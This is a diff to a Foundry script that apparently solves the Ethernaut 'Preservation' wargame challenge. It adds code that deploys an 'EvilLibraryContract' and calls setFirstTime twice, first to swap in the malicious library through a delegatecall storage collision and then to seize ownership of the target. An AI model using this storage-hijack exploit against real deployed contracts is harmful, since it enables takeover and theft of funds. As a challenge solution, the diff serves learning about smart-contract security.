@@ -4,6 +4,7 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
 import "src/Preservation/Preservation.sol";
+import "./EvilLibraryContract.sol";
 
 contract PreservationScript is Script {
 
@@ -21,7 +22,7 @@ contract PreservationScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Preservation(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Preservation(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -33,7 +34,9 @@ contract PreservationScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Preservation();
+            LibraryContract lib1 = new LibraryContract();
+            LibraryContract lib2 = new LibraryContract();
+            target = new Preservation(address(lib1), address(lib1));
             vm.stopBroadcast();
         }
     }
@@ -45,5 +48,13 @@ contract PreservationScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+        
+        console.log("[Exploit]");
+        vm.startBroadcast(attacker);
+        EvilLibraryContract elib = new EvilLibraryContract();
+        target.setFirstTime(uint160(address(elib)));
+        target.setFirstTime(1337);
+        vm.stopBroadcast();
+        console.log("owner : %s", target.owner());
     }
 }
